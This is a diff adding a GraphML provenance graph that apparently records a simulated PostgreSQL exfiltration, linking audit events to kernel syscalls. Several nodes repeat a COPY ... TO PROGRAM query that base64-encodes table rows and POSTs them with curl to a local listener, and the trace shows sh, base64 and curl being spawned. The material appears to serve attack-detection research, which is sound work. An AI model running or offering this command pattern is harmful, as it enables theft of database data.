@@ -1,0 +1,1606 @@
+<?xml version='1.0' encoding='utf-8'?>
+<graphml xmlns="http://graphml.graphdrawing.org/xmlns" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://graphml.graphdrawing.org/xmlns http://graphml.graphdrawing.org/xmlns/1.0/graphml.xsd">
+  <key id="d37" for="edge" attr.name="id" attr.type="string" />
+  <key id="d36" for="edge" attr.name="last_seen" attr.type="double" />
+  <key id="d35" for="edge" attr.name="first_seen" attr.type="double" />
+  <key id="d34" for="edge" attr.name="event_ids" attr.type="string" />
+  <key id="d33" for="edge" attr.name="count" attr.type="long" />
+  <key id="d32" for="edge" attr.name="relation" attr.type="string" />
+  <key id="d31" for="edge" attr.name="rel" attr.type="string" />
+  <key id="d30" for="node" attr.name="dest_port" attr.type="long" />
+  <key id="d29" for="node" attr.name="dest_ip" attr.type="string" />
+  <key id="d28" for="node" attr.name="filepath" attr.type="string" />
+  <key id="d27" for="node" attr.name="arg" attr.type="string" />
+  <key id="d26" for="node" attr.name="syscall" attr.type="string" />
+  <key id="d25" for="node" attr.name="comm" attr.type="string" />
+  <key id="d24" for="node" attr.name="uid" attr.type="long" />
+  <key id="d23" for="node" attr.name="ppid" attr.type="long" />
+  <key id="d22" for="node" attr.name="pid" attr.type="long" />
+  <key id="d21" for="node" attr.name="last_seen" attr.type="double" />
+  <key id="d20" for="node" attr.name="shell_cmd" attr.type="string" />
+  <key id="d19" for="node" attr.name="is_program" attr.type="string" />
+  <key id="d18" for="node" attr.name="table_name" attr.type="string" />
+  <key id="d17" for="node" attr.name="timestamp_unix" attr.type="double" />
+  <key id="d16" for="node" attr.name="source" attr.type="string" />
+  <key id="d15" for="node" attr.name="event_id" attr.type="long" />
+  <key id="d14" for="node" attr.name="session_key" attr.type="long" />
+  <key id="d13" for="node" attr.name="client_port" attr.type="string" />
+  <key id="d12" for="node" attr.name="client_addr" attr.type="string" />
+  <key id="d11" for="node" attr.name="username" attr.type="string" />
+  <key id="d10" for="node" attr.name="database" attr.type="string" />
+  <key id="d9" for="node" attr.name="query" attr.type="string" />
+  <key id="d8" for="node" attr.name="event_type" attr.type="string" />
+  <key id="d7" for="node" attr.name="timestamp" attr.type="double" />
+  <key id="d6" for="node" attr.name="backend_pid" attr.type="long" />
+  <key id="d5" for="node" attr.name="session_start_time" attr.type="long" />
+  <key id="d4" for="node" attr.name="session_id" attr.type="long" />
+  <key id="d3" for="node" attr.name="type" attr.type="string" />
+  <key id="d2" for="graph" attr.name="last_event_ts" attr.type="double" />
+  <key id="d1" for="graph" attr.name="pending_spawn_ts" attr.type="double" />
+  <key id="d0" for="graph" attr.name="pending_spawn_source" attr.type="long" />
+  <graph edgedefault="directed">
+    <node id="('Query', 4637)">
+      <data key="d3">Query</data>
+      <data key="d4">57586</data>
+      <data key="d5">1788639304</data>
+      <data key="d6">57586</data>
+      <data key="d7">1788639304.0</data>
+      <data key="d8">ProcessUtility</data>
+      <data key="d9">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true';</data>
+      <data key="d10">casce_tpcb</data>
+      <data key="d11">analyst_bob</data>
+      <data key="d12">192.168.1.183</data>
+      <data key="d13">47586</data>
+      <data key="d14">57586</data>
+      <data key="d15">4637</data>
+      <data key="d16">postgres</data>
+      <data key="d17">1788639304.0</data>
+      <data key="d18">pgbench_accounts</data>
+      <data key="d19">True</data>
+      <data key="d20">base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true</data>
+    </node>
+    <node id="('Session', 57586)">
+      <data key="d3">Session</data>
+      <data key="d14">57586</data>
+      <data key="d17">1788639304.0</data>
+      <data key="d7">1788639304.0</data>
+    </node>
+    <node id="('Table', 'pgbench_accounts')">
+      <data key="d3">Table</data>
+      <data key="d4">57586</data>
+      <data key="d5">1788639304</data>
+      <data key="d6">57586</data>
+      <data key="d7">1788639304.0</data>
+      <data key="d8">ProcessUtility</data>
+      <data key="d9">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true';</data>
+      <data key="d10">casce_tpcb</data>
+      <data key="d11">analyst_bob</data>
+      <data key="d12">192.168.1.183</data>
+      <data key="d13">47586</data>
+      <data key="d14">57586</data>
+      <data key="d15">4637</data>
+      <data key="d16">postgres</data>
+      <data key="d17">1788639304.0</data>
+      <data key="d18">pgbench_accounts</data>
+      <data key="d19">True</data>
+      <data key="d20">base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true</data>
+      <data key="d21">1788639304.0</data>
+    </node>
+    <node id="('Query', 4638)">
+      <data key="d3">Query</data>
+      <data key="d4">57586</data>
+      <data key="d5">1788639304</data>
+      <data key="d6">57586</data>
+      <data key="d7">1788639304.0</data>
+      <data key="d8">ExecutorStart</data>
+      <data key="d9">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true';</data>
+      <data key="d10">casce_tpcb</data>
+      <data key="d11">analyst_bob</data>
+      <data key="d12">192.168.1.183</data>
+      <data key="d13">47586</data>
+      <data key="d14">57586</data>
+      <data key="d15">4638</data>
+      <data key="d16">postgres</data>
+      <data key="d17">1788639304.0</data>
+      <data key="d18">pgbench_accounts</data>
+      <data key="d19">True</data>
+      <data key="d20">base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true</data>
+    </node>
+    <node id="('Query', 4639)">
+      <data key="d3">Query</data>
+      <data key="d4">57586</data>
+      <data key="d5">1788639304</data>
+      <data key="d6">57586</data>
+      <data key="d7">1788639304.0</data>
+      <data key="d8">ExecutorEnd</data>
+      <data key="d9">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true';</data>
+      <data key="d10">casce_tpcb</data>
+      <data key="d11">analyst_bob</data>
+      <data key="d12">192.168.1.183</data>
+      <data key="d13">47586</data>
+      <data key="d14">57586</data>
+      <data key="d15">4639</data>
+      <data key="d16">postgres</data>
+      <data key="d17">1788639304.0</data>
+      <data key="d18">pgbench_accounts</data>
+      <data key="d19">True</data>
+      <data key="d20">base64 &gt; /tmp/exfil_base64_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true</data>
+    </node>
+    <node id="('Process', 57586)">
+      <data key="d3">Process</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1180174</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">global/pg_filenode.map</data>
+      <data key="d14">57586</data>
+      <data key="d15">4954</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1180174</data>
+      <data key="d21">1788639304.1218143</data>
+    </node>
+    <node id="('File', 'global/pg_filenode.map')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1180174</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">global/pg_filenode.map</data>
+      <data key="d14">57586</data>
+      <data key="d15">4954</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1180174</data>
+      <data key="d28">global/pg_filenode.map</data>
+    </node>
+    <node id="('File', 'global/pg_internal.init')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1180685</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">global/pg_internal.init</data>
+      <data key="d14">57586</data>
+      <data key="d15">4955</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1180685</data>
+      <data key="d28">global/pg_internal.init</data>
+    </node>
+    <node id="('File', '/dev/shm/PostgreSQL.262416354')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1184185</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">/dev/shm/PostgreSQL.262416354</data>
+      <data key="d14">57586</data>
+      <data key="d15">4956</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1184185</data>
+      <data key="d28">/dev/shm/PostgreSQL.262416354</data>
+    </node>
+    <node id="('File', 'base/16384/PG_VERSION')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1187117</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">base/16384/PG_VERSION</data>
+      <data key="d14">57586</data>
+      <data key="d15">4957</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1187117</data>
+      <data key="d28">base/16384/PG_VERSION</data>
+    </node>
+    <node id="('File', 'base/16384/pg_filenode.map')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1187603</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">base/16384/pg_filenode.map</data>
+      <data key="d14">57586</data>
+      <data key="d15">4958</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1187603</data>
+      <data key="d28">base/16384/pg_filenode.map</data>
+    </node>
+    <node id="('File', 'base/16384/pg_internal.init')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1187744</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">base/16384/pg_internal.init</data>
+      <data key="d14">57586</data>
+      <data key="d15">4959</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1187744</data>
+      <data key="d28">base/16384/pg_internal.init</data>
+    </node>
+    <node id="('File', 'base/16384/2601')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1195219</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">base/16384/2601</data>
+      <data key="d14">57586</data>
+      <data key="d15">4960</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1195219</data>
+      <data key="d28">base/16384/2601</data>
+    </node>
+    <node id="('File', '/usr/lib/postgresql/17/lib/pg_telemetry.so')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.119903</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">/usr/lib/postgresql/17/lib/pg_telemetry.so</data>
+      <data key="d14">57586</data>
+      <data key="d15">4961</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.119903</data>
+      <data key="d28">/usr/lib/postgresql/17/lib/pg_telemetry.so</data>
+    </node>
+    <node id="('File', '/dataset_workspace/postgres_events.json')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1206725</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">/dataset_workspace/postgres_events.json</data>
+      <data key="d14">57586</data>
+      <data key="d15">4968</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1206725</data>
+      <data key="d28">/dataset_workspace/postgres_events.json</data>
+      <data key="d21">1788639304.1218143</data>
+    </node>
+    <node id="('File', 'base/16384/17540')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1210523</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">base/16384/17540</data>
+      <data key="d14">57586</data>
+      <data key="d15">4969</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1210523</data>
+      <data key="d28">base/16384/17540</data>
+    </node>
+    <node id="('File', 'base/16384/17543')">
+      <data key="d3">File</data>
+      <data key="d22">57586</data>
+      <data key="d23">15042</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1211474</data>
+      <data key="d25">postgres</data>
+      <data key="d26">openat</data>
+      <data key="d27">base/16384/17543</data>
+      <data key="d14">57586</data>
+      <data key="d15">4970</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1211474</data>
+      <data key="d28">base/16384/17543</data>
+    </node>
+    <node id="('Process', 57587)">
+      <data key="d3">Process</data>
+      <data key="d22">57587</data>
+      <data key="d23">57586</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1214926</data>
+      <data key="d25">postgres</data>
+      <data key="d26">execve</data>
+      <data key="d27">/bin/sh</data>
+      <data key="d14">57586</data>
+      <data key="d15">4972</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1214926</data>
+      <data key="d21">1788639304.1233213</data>
+    </node>
+    <node id="('File', '/etc/ld.so.cache')">
+      <data key="d3">File</data>
+      <data key="d22">57587</data>
+      <data key="d23">57586</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1218972</data>
+      <data key="d25">sh</data>
+      <data key="d26">openat</data>
+      <data key="d27">/etc/ld.so.cache</data>
+      <data key="d14">57586</data>
+      <data key="d15">4974</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1218972</data>
+      <data key="d28">/etc/ld.so.cache</data>
+      <data key="d21">1788639304.1237614</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libc.so.6')">
+      <data key="d3">File</data>
+      <data key="d22">57587</data>
+      <data key="d23">57586</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1219172</data>
+      <data key="d25">sh</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libc.so.6</data>
+      <data key="d14">57586</data>
+      <data key="d15">4975</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1219172</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libc.so.6</data>
+      <data key="d21">1788639304.1238682</data>
+    </node>
+    <node id="('File', '/tmp/exfil_base64_curl.dat')">
+      <data key="d3">File</data>
+      <data key="d22">57587</data>
+      <data key="d23">57586</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.122253</data>
+      <data key="d25">sh</data>
+      <data key="d26">openat</data>
+      <data key="d27">/tmp/exfil_base64_curl.dat</data>
+      <data key="d14">57586</data>
+      <data key="d15">4976</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.122253</data>
+      <data key="d28">/tmp/exfil_base64_curl.dat</data>
+      <data key="d21">1788639304.1294293</data>
+    </node>
+    <node id="('Process', 57588)">
+      <data key="d3">Process</data>
+      <data key="d22">57588</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1223981</data>
+      <data key="d25">sh</data>
+      <data key="d26">execve</data>
+      <data key="d27">/usr/bin/base64</data>
+      <data key="d14">57586</data>
+      <data key="d15">4977</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1223981</data>
+      <data key="d21">1788639304.1228</data>
+    </node>
+    <node id="('File', '/dev/null')">
+      <data key="d3">File</data>
+      <data key="d22">57587</data>
+      <data key="d23">57586</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1233213</data>
+      <data key="d25">sh</data>
+      <data key="d26">openat</data>
+      <data key="d27">/dev/null</data>
+      <data key="d14">57586</data>
+      <data key="d15">4980</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1233213</data>
+      <data key="d28">/dev/null</data>
+    </node>
+    <node id="('Process', 57589)">
+      <data key="d3">Process</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1233923</data>
+      <data key="d25">sh</data>
+      <data key="d26">execve</data>
+      <data key="d27">/usr/bin/curl</data>
+      <data key="d14">57586</data>
+      <data key="d15">4981</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1233923</data>
+      <data key="d21">1788639304.1296155</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libcurl.so.4')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1237793</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libcurl.so.4</data>
+      <data key="d14">57586</data>
+      <data key="d15">4983</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1237793</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libcurl.so.4</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libz.so.1')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1238253</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libz.so.1</data>
+      <data key="d14">57586</data>
+      <data key="d15">4984</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1238253</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libz.so.1</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libnghttp2.so.14')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1239197</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libnghttp2.so.14</data>
+      <data key="d14">57586</data>
+      <data key="d15">4986</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1239197</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libnghttp2.so.14</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libidn2.so.0')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1239665</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libidn2.so.0</data>
+      <data key="d14">57586</data>
+      <data key="d15">4987</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1239665</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libidn2.so.0</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/librtmp.so.1')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1240053</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/librtmp.so.1</data>
+      <data key="d14">57586</data>
+      <data key="d15">4988</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1240053</data>
+      <data key="d28">/lib/x86_64-linux-gnu/librtmp.so.1</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libssh.so.4')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1240532</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libssh.so.4</data>
+      <data key="d14">57586</data>
+      <data key="d15">4989</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1240532</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libssh.so.4</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libpsl.so.5')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.124093</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libpsl.so.5</data>
+      <data key="d14">57586</data>
+      <data key="d15">4990</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.124093</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libpsl.so.5</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libssl.so.3')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1241267</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libssl.so.3</data>
+      <data key="d14">57586</data>
+      <data key="d15">4991</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1241267</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libssl.so.3</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libcrypto.so.3')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.124172</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libcrypto.so.3</data>
+      <data key="d14">57586</data>
+      <data key="d15">4992</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.124172</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libcrypto.so.3</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libgssapi_krb5.so.2')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1242177</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libgssapi_krb5.so.2</data>
+      <data key="d14">57586</data>
+      <data key="d15">4993</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1242177</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libgssapi_krb5.so.2</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libldap.so.2')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.124263</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libldap.so.2</data>
+      <data key="d14">57586</data>
+      <data key="d15">4994</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.124263</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libldap.so.2</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/liblber.so.2')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1243281</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/liblber.so.2</data>
+      <data key="d14">57586</data>
+      <data key="d15">4995</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1243281</data>
+      <data key="d28">/lib/x86_64-linux-gnu/liblber.so.2</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libzstd.so.1')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1243696</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libzstd.so.1</data>
+      <data key="d14">57586</data>
+      <data key="d15">4996</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1243696</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libzstd.so.1</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libbrotlidec.so.1')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1244109</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libbrotlidec.so.1</data>
+      <data key="d14">57586</data>
+      <data key="d15">4997</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1244109</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libbrotlidec.so.1</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libunistring.so.5')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.12445</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libunistring.so.5</data>
+      <data key="d14">57586</data>
+      <data key="d15">4998</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.12445</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libunistring.so.5</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libgnutls.so.30')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.124495</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libgnutls.so.30</data>
+      <data key="d14">57586</data>
+      <data key="d15">4999</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.124495</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libgnutls.so.30</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libhogweed.so.6')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1245518</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libhogweed.so.6</data>
+      <data key="d14">57586</data>
+      <data key="d15">5000</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1245518</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libhogweed.so.6</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libnettle.so.8')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1245897</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libnettle.so.8</data>
+      <data key="d14">57586</data>
+      <data key="d15">5001</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1245897</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libnettle.so.8</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libgmp.so.10')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.12464</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libgmp.so.10</data>
+      <data key="d14">57586</data>
+      <data key="d15">5002</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.12464</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libgmp.so.10</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libkrb5.so.3')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1246927</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libkrb5.so.3</data>
+      <data key="d14">57586</data>
+      <data key="d15">5003</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1246927</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libkrb5.so.3</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libk5crypto.so.3')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.12474</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libk5crypto.so.3</data>
+      <data key="d14">57586</data>
+      <data key="d15">5004</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.12474</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libk5crypto.so.3</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libcom_err.so.2')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1247835</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libcom_err.so.2</data>
+      <data key="d14">57586</data>
+      <data key="d15">5005</data>
+      <data key="d16">kernel</data>
